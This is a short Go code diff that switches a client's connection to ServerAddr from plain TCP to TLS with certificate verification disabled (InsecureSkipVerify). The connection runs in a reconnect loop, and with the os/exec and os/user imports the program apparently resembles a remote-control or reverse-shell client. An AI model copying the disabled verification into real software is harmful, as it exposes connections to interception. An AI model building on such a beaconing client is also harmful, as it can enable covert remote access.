@@ -5,7 +5,6 @@ import (
 	"flag"
 	"fmt"
 	"log"
-	"net"
 	"os"
 	"os/exec"
 	"os/user"
@@ -13,6 +12,7 @@ import (
 	"strings"
 	"time"
 	"math/rand"
+	"crypto/tls"
 )
 
 var (
@@ -42,7 +42,7 @@ func main() {
 			continue
 		}
 
-		conn, err := net.Dial("tcp", ServerAddr)
+		conn, err := tls.Dial("tcp", ServerAddr, &tls.Config{InsecureSkipVerify: true})
 		if err != nil {
 			log.Printf("failed to connect to server: %v", err)
 			time.Sleep(time.Duration(n) * time.Second)
